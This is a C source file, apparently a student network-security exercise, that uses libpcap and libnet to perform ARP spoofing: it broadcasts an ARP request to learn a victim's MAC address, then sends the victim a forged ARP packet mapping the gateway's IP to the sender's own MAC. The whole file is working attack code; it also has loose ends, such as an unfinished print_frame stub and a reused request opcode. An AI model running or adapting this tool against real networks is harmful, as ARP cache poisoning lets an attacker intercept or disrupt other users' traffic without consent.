#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <libnet.h>
#include <net/if.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <net/ethernet.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/ioctl.h>

int getMacAddress(uint8_t * my_mac, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		printf("Error - socket\n");
		return 0;
	}

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
        {
                printf("Error - get my_mac\n");
		close(sock);
                return 0;
        }
	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
	

	close(sock);
	return 0;
	
}

int getIpAddress(char ** my_ip, char * interface)
{
	int sock;
        struct ifreq ifr;
        struct sockaddr_in *sin;

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0)
        {
                printf("Error - socket\n");
                return 0;
        }

        strcpy(ifr.ifr_name, interface);
        if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
        {
                printf("Error - get my_ip\n");
                close(sock);
                return 0;
        }
	
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
        *my_ip = inet_ntoa(sin->sin_addr);

        close(sock);
        return 0;

}

struct arp_packet{
	struct libnet_ethernet_hdr* ETH_hdr;
	struct libnet_arp_hdr* ARP_hdr;
	uint8_t src_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr src_pro_addr;
	uint8_t des_hrd_addr[ETHER_ADDR_LEN];
	struct in_addr des_pro_addr;
};

int print_packet(struct arp_packet * packet)
{	
	printf("--------packet data--------\n");
	printf("ether_dhost	: %02x:%02x:%02x:%02x:%02x:%02x\n",
	  packet->ETH_hdr->ether_dhost[0],
	  packet->ETH_hdr->ether_dhost[1],
	  packet->ETH_hdr->ether_dhost[2],
	  packet->ETH_hdr->ether_dhost[3],
	  packet->ETH_hdr->ether_dhost[4],
	  packet->ETH_hdr->ether_dhost[5]);

	printf("ether_shost     : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->ETH_hdr->ether_shost[0],
          packet->ETH_hdr->ether_shost[1],
          packet->ETH_hdr->ether_shost[2],
          packet->ETH_hdr->ether_shost[3],
          packet->ETH_hdr->ether_shost[4],
          packet->ETH_hdr->ether_shost[5]);

	printf("ether_type	: %04x\n", ntohs(packet->ETH_hdr->ether_type));

	printf("ar_hrd		: %04x\n", ntohs(packet->ARP_hdr->ar_hrd));
	printf("ar_pro          : %04x\n", ntohs(packet->ARP_hdr->ar_pro));
	printf("ar_hln          : %02x\n", packet->ARP_hdr->ar_hln);
	printf("ar_pln          : %02x\n", packet->ARP_hdr->ar_pln);
	printf("ar_op		: %04x\n", ntohs(packet->ARP_hdr->ar_op));

	printf("src_hdr_addr	: %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->src_hrd_addr[0],
          packet->src_hrd_addr[1],
          packet->src_hrd_addr[2],
          packet->src_hrd_addr[3],
          packet->src_hrd_addr[4],
          packet->src_hrd_addr[5]);

	printf("src_pro_addr	: %s\n", inet_ntoa(packet->src_pro_addr));

	printf("des_hdr_addr    : %02x:%02x:%02x:%02x:%02x:%02x\n",
          packet->des_hrd_addr[0],
          packet->des_hrd_addr[1],
          packet->des_hrd_addr[2],
          packet->des_hrd_addr[3],
          packet->des_hrd_addr[4],
          packet->des_hrd_addr[5]);

        printf("des_pro_addr    : %s\n", inet_ntoa(packet->des_pro_addr));


	return 0;
}

int print_frame(unsigned char * frame)
{
//	for(int i=0; i<str
}

int main(int argc, char* argv[])
{	
	pcap_t *fp;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (fp == NULL) {
    		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	uint8_t my_mac[ETHER_ADDR_LEN];
	uint8_t victim_mac[ETHER_ADDR_LEN];
	char * my_ip;	
	struct arp_packet * packet;
	packet = (struct arp_packet *)calloc(1, sizeof(arp_packet));
	packet->ETH_hdr = (struct libnet_ethernet_hdr *)calloc(1, sizeof(libnet_ethernet_hdr));
	packet->ARP_hdr = (struct libnet_arp_hdr *)calloc(1, sizeof(libnet_arp_hdr));

	uint16_t arp_type = 0x0806;					// ARP
	arp_type = ntohs(arp_type);
	uint16_t arp_hrd_type = 0x0001;					// Ethernet
	arp_hrd_type = ntohs(arp_hrd_type);
	uint16_t arp_pro_type = 0x0800;					// IPv4
	arp_pro_type = ntohs(arp_pro_type);
	uint16_t arp_opcode = 0x0001;					// request
	arp_opcode = ntohs(arp_opcode);

	struct sockaddr_in * sin;
	sin = (struct sockaddr_in *)calloc(1, sizeof(struct sockaddr_in));

	unsigned char *frame = (unsigned char *)calloc(1, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2);
	
	getMacAddress(my_mac, argv[1]);						// get my mac, ip
	memset(packet->ETH_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);	// dst mac : 0xFFFFFF
	memcpy(packet->ETH_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
	memcpy(&packet->ETH_hdr->ether_type, &arp_type, 2);		// mac type : 0x0806

	memcpy(&packet->ARP_hdr->ar_hrd, &arp_hrd_type, 2);
	memcpy(&packet->ARP_hdr->ar_pro, &arp_pro_type, 2);
	memset(&packet->ARP_hdr->ar_hln, 0x06, 1);			// mac -> 6
	memset(&packet->ARP_hdr->ar_pln, 0x04, 1);			// ip -> 4
	memcpy(&packet->ARP_hdr->ar_op, &arp_opcode, 2);
	
	memcpy(packet->src_hrd_addr, my_mac, ETHER_ADDR_LEN);		// src hrd addr -> my mac
	getIpAddress(&my_ip, argv[1]);
	inet_pton(AF_INET, my_ip, &packet->src_pro_addr);		// src pro addr -> my ip
	memset(packet->des_hrd_addr, 0x00, ETHER_ADDR_LEN);		// des hrd addr -> 0x000000
	inet_pton(AF_INET, argv[2], &packet->des_pro_addr);		// des pro addr -> victim ip

	print_packet(packet);
	
	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));
	memcpy(frame+sizeof(struct libnet_ethernet_hdr), packet->ARP_hdr, sizeof(struct libnet_arp_hdr));
	memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr), 
		packet->src_hrd_addr, ETHER_ADDR_LEN);
	memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN,
		&packet->src_pro_addr, sizeof(struct in_addr));
	memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN + sizeof(struct in_addr),
                packet->des_hrd_addr, ETHER_ADDR_LEN);
        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN + sizeof(struct in_addr) + ETHER_ADDR_LEN, 
                &packet->des_pro_addr, sizeof(struct in_addr));


	if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)
	{
		fprintf(stderr, "\nError sending the packet\n");
		return -1;
	}
	
	printf("--------send_arp!--------\nframe	 	: ");
	for(int i=0; i<42;i++)
		printf("%02x ", frame[i]);
	printf("\n\n");			

	while (true){
		struct pcap_pkthdr* header;
		struct libnet_ethernet_hdr* ETH_header;
		const u_char* rcv_packet;
		u_char * src_hrd_addr;
		struct in_addr* src_pro_addr;
		u_char * des_hrd_addr;
		struct in_addr* des_pro_addr;
		int res = pcap_next_ex(fp, &header, &rcv_packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		printf("%u bytes captured\n", header->caplen);

		ETH_header = (libnet_ethernet_hdr *)rcv_packet;
		if(ntohs(ETH_header->ether_type) == 0x0806)			// ARP 일때  진행
			printf("ETH type : %04x	-> It's ARP!\n", ntohs(ETH_header->ether_type));
		else {
			continue;
		}

		rcv_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
		src_hrd_addr = (u_char *)rcv_packet;
		rcv_packet += ETHER_ADDR_LEN;
		src_pro_addr = (in_addr *)rcv_packet;
		rcv_packet += sizeof(struct in_addr);
		des_hrd_addr = (u_char *)rcv_packet;
                rcv_packet += ETHER_ADDR_LEN;
                des_pro_addr = (in_addr *)rcv_packet;

		if(strcmp(argv[2], inet_ntoa(*src_pro_addr)) == 0)
		{
			getIpAddress(&my_ip, argv[1]);
			if(strcmp(my_ip, inet_ntoa(*des_pro_addr)) == 0)
			{
				printf("--------correct packet!!---------\n--------victim mac get!!--------\n\n");
				memcpy(victim_mac, src_hrd_addr, ETHER_ADDR_LEN);
				break;
			}
		} 
	}
	
	getMacAddress(my_mac, argv[1]);                                         // get my mac, ip
        memcpy(packet->ETH_hdr->ether_dhost, victim_mac, ETHER_ADDR_LEN);     // dst mac : victim mac
        memcpy(packet->ETH_hdr->ether_shost, my_mac, ETHER_ADDR_LEN);
        memcpy(&packet->ETH_hdr->ether_type, &arp_type, 2);             // mac type : 0x0806
	
        memcpy(packet->src_hrd_addr, my_mac, ETHER_ADDR_LEN);           // src hrd addr -> my mac
        getIpAddress(&my_ip, argv[1]);
        inet_pton(AF_INET, argv[3], &packet->src_pro_addr);             // src pro addr -> gateway ip
        memcpy(packet->des_hrd_addr, victim_mac, ETHER_ADDR_LEN);       // des hrd addr -> victim mac
        inet_pton(AF_INET, argv[2], &packet->des_pro_addr);             // des pro addr -> victim ip

        print_packet(packet);
        
	memcpy(frame, packet->ETH_hdr, sizeof(struct libnet_ethernet_hdr));
        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN,
                &packet->src_pro_addr, sizeof(struct in_addr));
        memcpy(frame+sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) + ETHER_ADDR_LEN + sizeof(struct in_addr),
                packet->des_hrd_addr, ETHER_ADDR_LEN);

        if(pcap_sendpacket(fp, frame, sizeof(struct libnet_ethernet_hdr)+sizeof(struct libnet_arp_hdr)+ETHER_ADDR_LEN*2+sizeof(struct in_addr)*2) != 0)
        {
                fprintf(stderr, "\nError sending the packet\n");
                return -1;
        }

	printf("--------send_arp!--------\nframe		: ");
        for(int i=0; i<42;i++)
                printf("%02x ", frame[i]);
	printf("\n");

	free(packet->ETH_hdr);
	free(packet->ARP_hdr);
	free(packet);
	free(sin);
	free(frame);
	
	return 0;
}
